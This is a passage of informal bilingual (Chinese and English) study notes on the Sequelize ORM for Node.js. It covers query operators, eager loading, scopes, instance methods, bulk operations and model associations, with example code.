				createdAt: Fri Mar 22 2013 21: 28: 34 GMT + 0100(CET),
				updatedAt: Fri Mar 22 2013 21: 28: 34 GMT + 0100(CET)
			}
			created: true
		*/
	})
})

//findOrCreate 如果已存在的情况，defaults指定了的话也是一个存在条件, 这时created是false
User
	.create({ username: 'fnord', job: 'omnomnom'  })
	.then(function() {
		User
			.findOrCreate({where: {username: 'fnord'}, defaults: {job: 'something else'}})
			.spread(function(user, created) {
				console.log(user.get({
					plain: true

				}))
				console.log(created)

				/*
					{
						username: 'fnord',
						job: 'omnomnom',
						id: 2,
						createdAt: Fri Mar 22 2013 21: 28: 34 GMT + 0100(CET),
						updatedAt: Fri Mar 22 2013 21: 28: 34 GMT + 0100(CET)
					}
					created: false
				*/
			})
	})

//findAndCountAll 返回所有内容和计算数量,方便计算分页 ,得出的结果有count和rows属性, count是总个数, rows是个数组，里面按给到的offset和limit排放model
Project
	.findAndCountAll({
		where: {
			title: {
				$like: 'foo%' //如何使用like
			}
		},
		offset: 10,
		limit: 2
	})
	.then(function(result) {
		console.log(result.count);
		console.log(result.rows);
	});

也支持includes
User.findAndCountAll({
	include: [
		{ model: Profile, required: true }
	],
	limit: 3
});
//上面这种情况，只会找出有profile的user,当required是false的时候，就也可以拿出没profile的User, 子查询也能用where语句
User.findAndCountAll({
  include: [
     { model: Profile, where: { active: true }}
  ],
  limit: 3
});

//!!! findAll, 和findAndCountAll里可传的条件一样，就是返回的result直接就是所有命中的model的数组
// find multiple entries
Project.findAll().then(function(projects) {
  // projects will be an array of all Project instances
})

// also possible:
Project.all().then(function(projects) {
  // projects will be an array of all Project instances
})

// search for specific attributes - hash usage
Project.findAll({ where: { name: 'A Project' } }).then(function(projects) {
  // projects will be an array of Project instances with the specified name
})

// search with string replacements
Project.findAll({ where: ["id > ?", 25] }).then(function(projects) { //条件查询
  // projects will be an array of Projects having a greater id than 25
})

// search within a specific range
Project.findAll({ where: { id: [1,2,3] } }).then(function(projects) { // id 1,2,3的出来
  // projects will be an array of Projects having the id 1, 2 or 3
  // this is actually doing an IN query
})

Project.findAll({
  where: {
    id: {
      $and: {a: 5}           // AND (a = 5) //符合查询
      $or: [{a: 5}, {a: 6}]  // (a = 5 OR a = 6)
      $gt: 6,                // id > 6
      $gte: 6,               // id >= 6
      $lt: 10,               // id < 10
      $lte: 10,              // id <= 10
      $ne: 20,               // id != 20
      $between: [6, 10],     // BETWEEN 6 AND 10
      $notBetween: [11, 15], // NOT BETWEEN 11 AND 15
      $in: [1, 2],           // IN [1, 2]
      $notIn: [1, 2],        // NOT IN [1, 2]
      $like: '%hat',         // LIKE '%hat'
      $notLike: '%hat'       // NOT LIKE '%hat'
      $iLike: '%hat'         // ILIKE '%hat' (case insensitive)  (PG only)
      $notILike: '%hat'      // NOT ILIKE '%hat'  (PG only)
      $overlap: [1, 2]       // && [1, 2] (PG array overlap operator)
      $contains: [1, 2]      // @> [1, 2] (PG array contains operator)
      $contained: [1, 2]     // <@ [1, 2] (PG array contained by operator)
      $any: [2,3]            // ANY ARRAY[2, 3]::INTEGER (PG only)
    },
    status: {
      $not: false,           // status NOT FALSE
    }
  }
})

##新版Operator !!
const Op = Sequelize.Op

[Op.and]: {a: 5}           // AND (a = 5)
[Op.or]: [{a: 5}, {a: 6}]  // (a = 5 OR a = 6)
[Op.gt]: 6,                // > 6
[Op.gte]: 6,               // >= 6
[Op.lt]: 10,               // < 10
[Op.lte]: 10,              // <= 10
[Op.ne]: 20,               // != 20
[Op.eq]: 3,                // = 3
[Op.not]: true,            // IS NOT TRUE
[Op.between]: [6, 10],     // BETWEEN 6 AND 10
[Op.notBetween]: [11, 15], // NOT BETWEEN 11 AND 15
[Op.in]: [1, 2],           // IN [1, 2]
[Op.notIn]: [1, 2],        // NOT IN [1, 2]
[Op.like]: '%hat',         // LIKE '%hat'
[Op.notLike]: '%hat'       // NOT LIKE '%hat'
[Op.iLike]: '%hat'         // ILIKE '%hat' (case insensitive) (PG only)
[Op.notILike]: '%hat'      // NOT ILIKE '%hat'  (PG only)
[Op.regexp]: '^[h|a|t]'    // REGEXP/~ '^[h|a|t]' (MySQL/PG only)
[Op.notRegexp]: '^[h|a|t]' // NOT REGEXP/!~ '^[h|a|t]' (MySQL/PG only)
[Op.iRegexp]: '^[h|a|t]'    // ~* '^[h|a|t]' (PG only)
[Op.notIRegexp]: '^[h|a|t]' // !~* '^[h|a|t]' (PG only)
[Op.like]: { [Op.any]: ['cat', 'hat']}
                       // LIKE ANY ARRAY['cat', 'hat'] - also works for iLike and notLike
[Op.overlap]: [1, 2]       // && [1, 2] (PG array overlap operator)
[Op.contains]: [1, 2]      // @> [1, 2] (PG array contains operator)
[Op.contained]: [1, 2]     // <@ [1, 2] (PG array contained by operator)
[Op.any]: [2,3]            // ANY ARRAY[2, 3]::INTEGER (PG only)

[Op.col]: 'user.organization_id' // = "user"."organization_id", with dialect specific column identifiers, PG in this example

新版用法
const Op = Sequelize.Op;
Post.update({
  updatedAt: null,
}, {
  where: {
    deletedAt: {
      [Op.ne]: null
    }
  }
});

//更复杂的filtering / or / not 
Project.findOne({
  where: {
    name: 'a project',
    $or: [
      { id: [1,2,3] },
      { id: { $gt: 10 } }
    ]
  }
})

Project.findOne({
  where: {
    name: 'a project',
    id: {
      $or: [
        [1,2,3],
        { $gt: 10 }
      ]
    }
  }
})

//生成
SELECT *
FROM `Projects`
WHERE (
  `Projects`.`name` = 'a project'
   AND (`Projects`.`id` IN (1,2,3) OR `Projects`.`id` > 10)
)
LIMIT 1;

//NOT
Project.findOne({
  where: {
    name: 'a project',
    $not: [
      { id: [1,2,3] },
      { array: { $contains: [3,4,5] } }
    ]
  }
});

//生成
SELECT *
FROM `Projects`
WHERE (
  `Projects`.`name` = 'a project'
   AND NOT (`Projects`.`id` IN (1,2,3) OR `Projects`.`array` @> ARRAY[1,2,3]::INTEGER[])
)
LIMIT 1;

//Limit / offset / group
// limit the results of the query
Project.findAll({ limit: 10 })

// step over the first 10 elements
Project.findAll({ offset: 10 })

// step over the first 10 elements, and take 2
Project.findAll({ offset: 10, limit: 2 })

Project.findAll({order: 'title DESC'})
// yields ORDER BY title DESC

Project.findAll({group: 'name'})
// yields GROUP BY name
// 
//order 和内置函数的使用方式
something.findOne({
  order: [
    'name',
    // will return `name`
    'username DESC',
    // will return `username DESC` -- i.e. don't do it!
    ['username', 'DESC'],
    // will return `username` DESC
    sequelize.fn('max', sequelize.col('age')),
    // will return max(`age`)
    [sequelize.fn('max', sequelize.col('age')), 'DESC'],
    // will return max(`age`) DESC
    [sequelize.fn('otherfunction', sequelize.col('col1'), 12, 'lalala'), 'DESC'],
    // will return otherfunction(`col1`, 12, 'lalala') DESC
    [sequelize.fn('otherfunction', sequelize.fn('awesomefunction', sequelize.col('col'))), 'DESC']
    // will return otherfunction(awesomefunction(`col`)) DESC, This nesting is potentially infinite!
    [{ raw: 'otherfunction(awesomefunction(`col`))' }, 'DESC']
    // This won't be quoted, but direction will be added
  ]
})

//Raw 查询，发挥最原始的json，不做成model
//
// Are you expecting a massive dataset from the DB,
// and don't want to spend the time building DAOs for each entry?
// You can pass an extra query option to get the raw data instead:
Project.findAll({ where: { ... }, raw: true })

//count
Project.count().then(function(c) {
  console.log("There are " + c + " projects!")
})

Project.count({ where: ["id > ?", 25] }).then(function(c) {
  console.log("There are " + c + " projects with an id greater than 25.")
})

//max min

/*
  Let's assume 3 person objects with an attribute age.
  The first one is 10 years old,
  the second one is 5 years old,
  the third one is 40 years old.
*/
Project.max('age').then(function(max) {
  // this will return 40
})

Project.max('age', { where: { age: { lt: 20 } } }).then(function(max) {
  // will be 10
})

Project.min('age').then(function(min) {
  // this will return 5
})

Project.min('age', { where: { age: { $gt: 5 } } }).then(function(min) {
  // will be 10
})

Project.sum('age').then(function(sum) {
  // this will return 55
})

Project.sum('age', { where: { age: { $gt: 5 } } }).then(function(sum) {
  // will be 50
})

//Eager Loading
//假设有如下关系
var User = sequelize.define('user', { name: Sequelize.STRING })
  , Task = sequelize.define('task', { name: Sequelize.STRING })
  , Tool = sequelize.define('tool', { name: Sequelize.STRING })

Task.belongsTo(User)
User.hasMany(Task)
User.hasMany(Tool, { as: 'Instruments' })

sequelize.sync().then(function() {
  // this is where we continue ...
})

//从task拿出所有User
Task.findAll({ include: [ User ] }).then(function(tasks) {
  console.log(JSON.stringify(tasks))

  /*
    [{
      "name": "A Task",
      "id": 1,
      "createdAt": "2013-03-20T20:31:40.000Z",
      "updatedAt": "2013-03-20T20:31:40.000Z",
      "userId": 1,
      "user": {
        "name": "John Doe",
        "id": 1,
        "createdAt": "2013-03-20T20:31:45.000Z",
        "updatedAt": "2013-03-20T20:31:45.000Z"
      }
    }]
  */
}) //这里user是单个

//看看includes是多个的情况

User.findAll({ include: [ Task ] }).then(function(users) {
  console.log(JSON.stringify(users))

  /*
    [{
      "name": "John Doe",
      "id": 1,
      "createdAt": "2013-03-20T20:31:45.000Z",
      "updatedAt": "2013-03-20T20:31:45.000Z",
      "tasks": [{
        "name": "A Task",
        "id": 1,
        "createdAt": "2013-03-20T20:31:40.000Z",
        "updatedAt": "2013-03-20T20:31:40.000Z",
        "userId": 1
      }]
    }]
  */
}) //这里的task会变成复数

//用as可以更改拿回来的key name, 也可以在拿的时候指定
User.findAll({ include: [{ model: Tool, as: 'Instruments' }] }).then(function(users) {
  console.log(JSON.stringify(users))
  /*
    [{
      "name": "John Doe",
      "id": 1,
      "createdAt": "2013-03-20T20:31:45.000Z",
      "updatedAt": "2013-03-20T20:31:45.000Z",
      "Instruments": [{
        "name": "Toothpick",
        "id": 1,
        "createdAt": null,
        "updatedAt": null,
        "userId": 1
      }]
    }]
  */
})

//在关联查询里也可以使用条件查询，这是查出符合条件的tool
User.findAll({
    include: [{
        model: Tool,
        as: 'Instruments',
        where: { name: { $like: '%ooth%' } }
    }]
}).then(function(users) {
    console.log(JSON.stringify(users))

    /*
      [{
        "name": "John Doe",
        "id": 1,
        "createdAt": "2013-03-20T20:31:45.000Z",
        "updatedAt": "2013-03-20T20:31:45.000Z",
        "Instruments": [{
          "name": "Toothpick",
          "id": 1,
          "createdAt": null,
          "updatedAt": null,
          "userId": 1
        }]
      }],

      [{
        "name": "John Smith",
        "id": 2,
        "createdAt": "2013-03-20T20:31:45.000Z",
        "updatedAt": "2013-03-20T20:31:45.000Z",
        "Instruments": [{
          "name": "Toothpick",
          "id": 1,
          "createdAt": null,
          "updatedAt": null,
          "userId": 1
        }]
      }],
    */
})

//可以这样把所有需要include的 has_many都拿出来
User.findAll({ include: [{ all: true }]});

//关联查询 排序
Company.findAll({ include: [ Division ], order: [ [ Division, 'name' ] ] });
Company.findAll({ include: [ Division ], order: [ [ Division, 'name', 'DESC' ] ] });
Company.findAll({
  include: [ { model: Division, as: 'Div' } ],
  order: [ [ { model: Division, as: 'Div' }, 'name' ] ]
});
Company.findAll({
  include: [ { model: Division, as: 'Div' } ],
  order: [ [ { model: Division, as: 'Div' }, 'name', 'DESC' ] ]
});
Company.findAll({
  include: [ { model: Division, include: [ Department ] } ],
  order: [ [ Division, Department, 'name' ] ]
});

//many to many的情况，中间表也可以排序
Company.findAll({
  include: [ { model: Division, include: [ Department ] } ],
  order: [ [ Division, DepartmentDivision, 'name' ] ]
});

//nested Eager Loading的情况
User.findAll({
  include: [
    {model: Tool, as: 'Instruments', include: [
      {model: Teacher, include: [ /* etc */]}
    ]}
  ]
}).then(function(users) {
  console.log(JSON.stringify(users))

  /*
    [{
      "name": "John Doe",
      "id": 1,
      "createdAt": "2013-03-20T20:31:45.000Z",
      "updatedAt": "2013-03-20T20:31:45.000Z",
      "Instruments": [{ // 1:M and N:M association
        "name": "Toothpick",
        "id": 1,
        "createdAt": null,
        "updatedAt": null,
        "userId": 1,
        "Teacher": { // 1:1 association
          "name": "Jimi Hendrix"
        }
      }]
    }]
  */
})

//嵌套两层时，很容易每个 第二层嵌套产生outer join， 这个时候加上 required: false ， 可以减少查询
User.findAll({
  include: [{
    model: Tool,
    as: 'Instruments',
    include: [{
      model: Teacher,
      where: {
        school: "Woodstock Music School"
      },
      required: false
    }]
  }]
}).then(function(users) {
  /* ... */
})//会拿出所有user和他们的instrument, 但只有符合 school条件的teacher才会拿出来

//大杀器，include all 也可以 nest all, 这个就很恐怖
User.findAll({ include: [{ all: true, nested: true }]});

--------------------------------------------------

5) Querying 查询里的点点滴滴
//如果只查询某些字段就好，可以用attributes属性, 对应 select foo, bar
Model.findAll({
  attributes: ['foo', 'bar']
});

//Attributes可以更名, select bar as baz
Model.findAll({
  attributes: ['foo', ['bar', 'baz']]
});

//取反,挺好用
Model.findAll({
  attributes: { exclude: ['baz'] }
});

//!! where
Post.destroy({
  where: {
    status: 'inactive'
  }
});
// DELETE FROM post WHERE status = 'inactive';

Post.update({
  updatedAt: null,
}, {
  where: {
    deletedAt: {
      $ne: null
    }
  }
});
// UPDATE post SET updatedAt = null WHERE deletedAt NOT NULL;

Post.findAll({
  where: sequelize.where(sequelize.fn('char_length', sequelize.col('status')), 6)
});
// SELECT * FROM post WHERE char_length(status) = 6;

//各种operator, 这个比rails原生的方便
$and: {a: 5}           // AND (a = 5)
$or: [{a: 5}, {a: 6}]  // (a = 5 OR a = 6)
$gt: 6,                // > 6
$gte: 6,               // >= 6
$lt: 10,               // < 10
$lte: 10,              // <= 10
$ne: 20,               // != 20
$not: true,            // IS NOT TRUE
$between: [6, 10],     // BETWEEN 6 AND 10
$notBetween: [11, 15], // NOT BETWEEN 11 AND 15
$in: [1, 2],           // IN [1, 2]
$notIn: [1, 2],        // NOT IN [1, 2]
$like: '%hat',         // LIKE '%hat'
$notLike: '%hat'       // NOT LIKE '%hat'
$iLike: '%hat'         // ILIKE '%hat' (case insensitive) (PG only)
$notILike: '%hat'      // NOT ILIKE '%hat'  (PG only)
$like: { $any: ['cat', 'hat']}
                       // LIKE ANY ARRAY['cat', 'hat'] - also works for iLike and notLike
$overlap: [1, 2]       // && [1, 2] (PG array overlap operator)
$contains: [1, 2]      // @> [1, 2] (PG array contains operator)
$contained: [1, 2]     // <@ [1, 2] (PG array contained by operator)
$any: [2,3]            // ANY ARRAY[2, 3]::INTEGER (PG only)
$col: 'user.organization_id' // = "user"."organization_id", with dialect specific column identifiers, PG in this example

//operator可以各种组合
{
  rank: {
    $or: {
      $lt: 1000,
      $eq: null
    }
  }
}
// rank < 1000 OR rank IS NULL

{
  createdAt: {
    $lt: new Date(),
    $gt: new Date(new Date() - 24 * 60 * 60 * 1000)
  }
}
// createdAt < [timestamp] AND createdAt > [timestamp]

{
  $or: [
    {
      title: {
        $like: 'Boat%'
      }
    },
    {
      description: {
        $like: '%boat%'
      }
    }
  ]
}
// title LIKE 'Boat%' OR description LIKE '%boat%'

//如何查询jsonb !!! 三种方法
{ //1
  meta: {
    video: {
      url: {
        $ne: null
      }
    }
  }
}

{//2
  "meta.audio.length": {
    $gt: 20
  }
}

{//
  "meta": {
    $contains: {
      site: {
        url: 'http://google.com'
      }
    }
  }
}

//复习下关联查询里的条件查询
Project.findAll({
  include: [{
    model: Task,
    where: { state: Sequelize.col('project.state') }
  }]
})


//分页
// Fetch 10 instances/rows
Project.findAll({ limit: 10 })

// Skip 8 instances/rows
Project.findAll({ offset: 8 })

// Skip 5 instances and fetch the 5 after that
Project.findAll({ offset: 5, limit: 5 })

//排序
something.findOne({
  order: [
    // Will escape username and validate DESC against a list of valid direction parameters
    ['username', 'DESC'],

    // Will order by max(age)
    sequelize.fn('max', sequelize.col('age')),

    // Will order by max(age) DESC
    [sequelize.fn('max', sequelize.col('age')), 'DESC'],

    // Will order by  otherfunction(`col1`, 12, 'lalala') DESC
    [sequelize.fn('otherfunction', sequelize.col('col1'), 12, 'lalala'), 'DESC'],

    // Will order by name on an associated User
    [User, 'name', 'DESC'],

    // Will order by name on an associated User aliased as Friend
    [{model: User, as: 'Friend'}, 'name', 'DESC'],

    // Will order by name on a nested associated Company of an associated User
    [User, Company, 'name', 'DESC'],
  ]
  // All the following statements will be treated literally so should be treated with care
  order: 'convert(user_name using gbk)'
  order: 'username DESC'
  order: sequelize.literal('convert(user_name using gbk)')
})

------------------------

6)Scopes 跟Rails的scope一样，可以复用的查讯

//define时定义 scopes
var Project = sequelize.define('project', {
  // Attributes
}, {
  defaultScope: { //这个定义了后，以后默认Project.findAll()都会加上这个条件.查的时候可以用.unscoped(), .scope(null) 去去除
    where: {
      active: true
    }
  },
  scopes: {
    deleted: {
      where: {
        deleted: true
      }
    },
    activeUsers: {
      include: [
        { model: User, where: { active: true }}
      ]
    }
    random: function () {
      return {
        where: {
          someNumber: Math.random()
        }
      }
    },
    accessLevel: function (value) {
      return {
        where: {
          accessLevel: {
            $gte: value
          }
        }
      }
    }
  }
});

Project.scope('deleted').findAll(); // Removes the default scope查询时定义其他scope也会去除defaultScope

//使用方法
var DeletedProjects = Project.scope('deleted');

DeletedProjects.findAll();
// some time passes

// let's look for deleted projects again!
DeletedProjects.findAll();

scope还可以和.find, .findAll, .count, .update and .destroy 一起用

//scope当where那样用
Project.scope('random', { method: ['accessLevel', 19]}).findAll(); // SELECT * FROM projects WHERE someNumber = 42 AND accessLevel >= 19

//Merging组合
// These two are equivalent
Project.scope('deleted', 'activeUsers').findAll();
Project.scope(['deleted', 'activeUsers']).findAll();

SELECT * FROM projects INNER JOIN users ON projects.userId = users.id AND users.active = true


//也可以把defaultScope带上
Project.scope('defaultScope', 'deleted').findAll();

//注意如果合并的条件一样，后面一个会覆盖前面一个
{
  scope1: {
    where: {
      firstName: 'bob',
      age: {
        $gt: 20
      }
    },
    limit: 2
  },
  scope2: {
    where: {
      age: {
        $gt: 30
      }
    },
    limit: 10
  }
}

//最后出来WHERE firstName = 'bob' AND age > 30 LIMIT 10

//Scope Association的问题
1.Association scopes Allow you to specify default attributes when getting and setting associations - useful when implementing polymorphic associations. This scope is only invoked on the association between the two models, when using the get, set, add and create associated model functions

2.Scopes on associated models Allows you to apply default and other scopes when fetching associations, and allows you to pass a scoped model when creating associations. These scopes both apply to regular finds on the model and to find through the association.

大意是写在scope里include出来的association查询，像polymophic多态出来这种 从post查出的comment, comment在保存时自动会把commentable设成'post', commentable_id也会设置成对应的post id

this.Post.hasMany(this.Comment, {
  foreignKey: 'commentable_id',
  scope: {
    commentable: 'post'
  }
});

post.getComments(), 查询自动会有 commentable = 'post'

但是呢，像你如果设了post defaultScope: {active: true}, 那user.getPosts()的时候拿出来的都是active = true 的post, 要取消就User.getPosts({ scope: null }) , 也可以User.getPosts({ scope: ['scope1', 'scope2']}); 跟Rails都差不多这实践

要方便的话也可以加scope到belongsTo的model
var Post = sequelize.define('post', attributes, {
  defaultScope: {
    where: {
      active: true
    }
  },
  scopes: {
    deleted: {
      where: {
        deleted: true
      }
    }
  }
});

User.hasMany(Post); // regular getPosts association
User.hasMany(Post.scope('deleted'), { as: 'deletedPosts' });

User.getPosts(); // WHERE active = true
User.getDeletedPosts(); // WHERE deleted = true


--------------------------------------------------
7)instance Model的实例可以干啥

//build 就是创建，不保存到持久化
var project = Project.build({
  title: 'my awesome project',
  description: 'woot woot. this will make me a rich man'
})
 
var task = Task.build({
  title: 'specify the project idea',
  description: 'bla',
  deadline: new Date()
})

//设了默认值，build也会有
// first define the model
var Task = sequelize.define('task', {
  title: Sequelize.STRING,
  rating: { type: Sequelize.STRING, defaultValue: 3 }
})
 
// now instantiate an object
var task = Task.build({title: 'very important task'})
 
task.title  // ==> 'very important task'
task.rating // ==> 3

//save就可以保存，可以顺带做错误处理，以后都换成es7的写法
project.save().then(function() {
  // my nice callback stuff
})
 
task.save().catch(function(error) {
  // mhhh, wth!
})
 
// you can also build, save and access the object with chaining:
Task
  .build({ title: 'foo', description: 'bar', deadline: new Date() })
  .save()
  .then(function(anotherTask) {
    // you can now access the currently saved task with the variable anotherTask... nice!
  }).catch(function(error) {
    // Ooops, do some error-handling
  })

//create就是build + save ,!!! 这里的fields字段就是白名单，isAdmin传上来也不能保存
User.create({ username: 'barfooz', isAdmin: true }, { fields: [ 'username' ] }).then(function(user) {
  // let's assume the default of isAdmin is false:
  console.log(user.get({
    plain: true
  })) // => { username: 'barfooz', isAdmin: false }
})

//update and save 下面等价
// way 1
task.title = 'a very different title now'
task.save().then(function() {})
 
// way 2
task.update({
  title: 'a very different title now'
}).then(function() {})

//同样可以做fields限制
task.title = 'foooo'
task.description = 'baaaaaar'
task.save({fields: ['title']}).then(function() {
 // title will now be 'foooo' but description is the very same as before
})
 
// The equivalent call using update looks like this:
task.update({ title: 'foooo', description: 'baaaaaar'}, {fields: ['title']}).then(function() {
 // title will now be 'foooo' but description is the very same as before
})


// Destroy
Task.create({ title: T 'a task' }).then(function(task) {
  // now you see me...
  return task.destroy();
}).then(function() {
 // now i'm gone :)
})

如果定义model时加了paranoid, 记录不会真的删除，然后deletedAt会设成当前时间，可以destroy({force: true})去强制删除这条记录


//bulk， cud处理多条记录时一次过
Model.bulkCreate
Model.update
Model.destroy

//create
User.bulkCreate([
  { username: 'barfooz', isAdmin: true },
  { username: 'foo', isAdmin: true },
  { username: 'bar', isAdmin: false }
]).then(function() { // Notice: There are no arguments here, as of right now you'll have to...
  return User.findAll();
}).then(function(users) {
  console.log(users) // ... in order to get the array of user objects
})

//update
Task.bulkCreate([
  {subject: 'programming', status: 'executing'},
  {subject: 'reading', status: 'executing'},
  {subject: 'programming', status: 'finished'}
]).then(function() {
  return Task.update(
    { status: 'inactive' }, /* set attributes' value */,
    { where: { subject: 'programming' }} /* where criteria */
  );
}).spread(function(affectedCount, affectedRows) {
  // .update returns two values in an array, therefore we use .spread
  // Notice that affectedRows will only be defined in dialects which support returning: true

  // affectedCount will be 2
  return Task.findAll();
}).then(function(tasks) {
  console.log(tasks) // the 'programming' tasks will both have a status of 'inactive'
})

//delete
Task.bulkCreate([
  {subject: 'programming', status: 'executing'},
  {subject: 'reading', status: 'executing'},
  {subject: 'programming', status: 'finished'}
]).then(function() {
  return Task.destroy({
    where: {
      subject: 'programming'
    },
    truncate: true /* this will ignore where and truncate the table instead */
  });
}).then(function(affectedRows) {
  // affectedRows will be 2
  return Task.findAll();
}).then(function(tasks) {
  console.log(tasks) // no programming, just reading :(
})<Paste>

//也可以用fields过滤
User.bulkCreate([
	{ username: 'foo'  },
	{ username: 'bar', admin: true }
], { fields: ['username']  }).then(function() {
	// nope bar, you can't be admin!
	//
})

//加valid: true不调过validate
var Tasks = sequelize.define('task', {
	name: {
		type: Sequelize.STRING,
		validate: {
			notNull: { args: true, msg: 'name cannot be null'  }

		}

	},
	code: {
		type: Sequelize.STRING,
		validate: {
			len: [3, 10]

		}

	}

})

Tasks.bulkCreate([
	{name: 'foo', code: '123'},
	{code: '1234'},
	{name: 'bar', code: '1'}

], { validate: true  }).catch(function(errors) {
	/* console.log(errors) would look like:
		[
			{ record:
			...
			errors:
			{ name: 'SequelizeValidationError',
			message: 'Validation error',
			errors: [Object] } },

			{ record:
			...
			errors: { 
			name: 'SequelizeValidationError',
			message: 'Validation error',
			errors: [Object] } }
		]
	*/
})

//get时用plain: true只拿json
Person.create({
    name: 'Rambow',
    firstname: 'John'
}).then(function(john) {
  console.log(john.get({
        plain: true
  }))
})
 
// result:
{
	name: 'Rambow',
	firstname: 'John',
	id: 1,
	createdAt: Tue, 01 May 2012 19:12:16 GMT,
	updatedAt: Tue, 01 May 2012 19:12:16 GMT
}

//对model用JSON.stringify(instance), 跟plain: true一样

//对integer用increment
User.findById(1).then(function(user) {
	return user.increment('my-integer-field', {by: 2})
}).then(/* ... */)

increase多个
User.findById(1).then(function(user) {
	return user.increment([ 'my-integer-field', 'my-very-other-field'  ], {by: 2})
}).then(/* ... */)

不同字段incre不同的
User.findById(1).then(function(user) {
	return user.increment({
		'my-integer-field':    2,
		'my-very-other-field': 3
	})
}).then(/* ... */)

//有increment也有decrement
--------------------------------------------------
8)Relations / Assocation !!!
后面的表述，User.hasOne(Project) //User是source, Project是target

var User = this.sequelize.define('user', {/* attributes */})
	, Company  = this.sequelize.define('company', {/* attributes */});

User.belongsTo(Company); // Will add companyId to user
var User = this.sequelize.define('user', {/* attributes */}, {underscored: true})
	, Company  = this.sequelize.define('company', {
		uuid: {
			type: Sequelize.UUID,
			primaryKey: true
		}
	});
User.belongsTo(Company); // Will add company_uuid to user

如果model定义的时候用了underscored: true, 那就不用驼峰标示法，另外company的primary_key id变了, 上面这种会生成company_uuid

//可以用as去定义属于的model key_name
User.belongsTo(UserRole, {as: 'role'}); // Adds roleId to user rather than userRoleId

//可以重写foreignKey
var User = this.sequelize.define('user', {/* attributes */})
  , Company  = this.sequelize.define('company', {/* attributes */});

User.belongsTo(Company, {foreignKey: 'fk_company'}); // Adds fk_company to User

//has_one情况
var User = sequelize.define('user', {/* ... */})
var Project = sequelize.define('project', {/* ... */})
 
// One-way associations
Project.hasOne(User)
Project.hasOne(User, { foreignKey: 'initiator_id'  }) //这种会自动为user加个project_id

/*
Because Sequelize will use the model's name (first parameter of define) for
the accessor methods, it is also possible to pass a special option to hasOne:
*/

Project.hasOne(User, { as: 'Initiator'  })
// Now you will get Project#getInitiator and Project#setInitiator

// Or let's define some self references
var Person = sequelize.define('person', { /* ... */ })

Person.hasOne(Person, {as: 'Father'})
// this will add the attribute FatherId to Person

// also possible:
Person.hasOne(Person, {as: 'Father', foreignKey: 'DadId'}) //自关联
// this will add the attribute DadId to Person

// In both cases you will be able to do:
Person#setFather //设好后可以用set 方法
Person#getFather

// If you need to join a table twice you can double join the same table
Team.hasOne(Game, {as: 'HomeTeam', foreignKey : 'homeTeamId'});
Team.hasOne(Game, {as: 'AwayTeam', foreignKey : 'awayTeamId'});

Game.belongsTo(Team);

//one to many, has many
var User = sequelize.define('user', {/* ... */})
var Project = sequelize.define('project', {/* ... */})
 
// OK. Now things get more complicated (not really visible to the user :)).
// // First let's define a hasMany association
Project.hasMany(User, {as: 'Workers'})
//这样添加后 project实例就有setWorker方法



//source_key 把关联设到另一个column上
var City = sequelize.define('city', { countryCode: Sequelize.STRING  });
var Country = sequelize.define('country', { isoCode: Sequelize.STRING  });

// Here we can connect countries and cities base on country code
Country.hasMany(City, {foreignKey: 'countryCode', sourceKey: 'isoCode'}); //Country是source，设定关联时说明白用我的isoCode找到city里countryCode = 我的isoCode的那个
City.belongsTo(Country, {foreignKey: 'countryCode', targetKey: 'isoCode'}); //City是target, foreignKey一样, targetKey是对应isoCode, 乱糟糟，最好不要这样配置啦


//belongs to many， 通常用在中间表, Rails里是has_many + belongs_to 呀
Project.belongsToMany(User, {through: 'UserProject'});
User.belongsToMany(Project, {through: 'UserProject'});
//auto sync会创建 UserProject表，里面有user_id, project_id
//会创建这些方法, This will add methods getUsers, setUsers, addUser,addUsers to Project, and getProjects,  setProjects, addProject, and addProjects to User.

//改名
User.belongsToMany(Project, { as: 'Tasks', through: 'worker_tasks', foreignKey: 'userId'  })
Project.belongsToMany(User, { as: 'Workers', through: 'worker_tasks', foreignKey: 'projectId' })

//otherKey用来设target的key
User.belongsToMany(Project, { as: 'Tasks', through: 'worker_tasks', foreignKey: 'userId', otherKey: 'projectId' })

//也可以用自关联
Person.belongsToMany(Person, { as: 'Children', through: 'PersonChildren'  })

//手动自定义中间表 !!!! many_to_many
User = sequelize.define('user', {})
Project = sequelize.define('project', {})
UserProjects = sequelize.define('userProjects', {
	status: DataTypes.STRING
})

User.belongsToMany(Project, { through: UserProjects  })
Project.belongsToMany(User, { through: UserProjects  })

//增加关联的model中间表可以这样写，可以用add第二个参数传数据额外的参数
user.addProject(project, { status: 'started'  })

正常来说上面这个代码，会自动创建一条中间表记录，自动对应user_id和project_id。但不会定义primary_key??，所以primary_key还是要自定义一下...

UserProjects = sequelize.define('userProjects', {
	id: {
				type: Sequelize.INTEGER,
				primaryKey: true,
				autoIncrement: true
			
	},
		status: DataTypes.STRING

})



//association 里的 scoepe， 设好关系后会自动生成
//例如有comment, image 和 post, comment属于commentable 多态的关联

this.Comment = this.sequelize.define('comment', {
	title: Sequelize.STRING,
	commentable: Sequelize.STRING,
	commentable_id: Sequelize.INTEGER
}, {
	instanceMethods: {
		getItem: function() {
			return this['get' + this.get('commentable').substr(0, 1).toUpperCase() + this.get('commentable').substr(1)]();
		}
	}
});

this.Post.hasMany(this.Comment, {
	foreignKey: 'commentable_id',
	constraints: false,
	scope: {
		commentable: 'post' //设定scope会自动拿post
	}
});
this.Comment.belongsTo(this.Post, {
	foreignKey: 'commentable_id',
	constraints: false, //cancel掉引用
	as: 'post'
});

this.Image.hasMany(this.Comment, {
	foreignKey: 'commentable_id',
	constraints: false,
	scope: {
		commentable: 'image'
	}
});
this.Comment.belongsTo(this.Image, {
	foreignKey: 'commentable_id',
	constraints: false,
	as: 'image'
});

所以有以下动态方法
image.getComments()
//SELECT * FROM comments WHERE commentable_id = 42 AND commentable = 'image';

image.createComment({
	title: 'Awesome!'
})
//INSERT INTO comments (title, commentable_id, commentable) VALUES ('Awesome!', 42, 'image');

image.addComment(comment);
//UPDATE comments SET commentable_id = 42, commentable = 'image'


//下面也是多态例子, tag , 跟之前rails里just项目设计一样, 中间表属于 tag, 同时对打标签的各种model是多态
ItemTag = sequelize.define('item_tag', {
	tag_id: {
		type: DataTypes.INTEGER,
		unique: 'item_tag_taggable'
	},
	taggable: {
		type: DataTypes.STRING,
		unique: 'item_tag_taggable'
	},
	taggable_id: {
		type: DataTypes.INTEGER,
		unique: 'item_tag_taggable',
		references: null
	}
});

Tag = sequelize.define('tag', {
	name: DataTypes.STRING
});

Post.belongsToMany(Tag, {
	through: {
		model: ItemTag,
		unique: false,
		scope: {
			taggable: 'post'
		}
	},
	foreignKey: 'taggable_id',
	constraints: false
});

Tag.belongsToMany(Post, {
	through: {
		model: ItemTag,
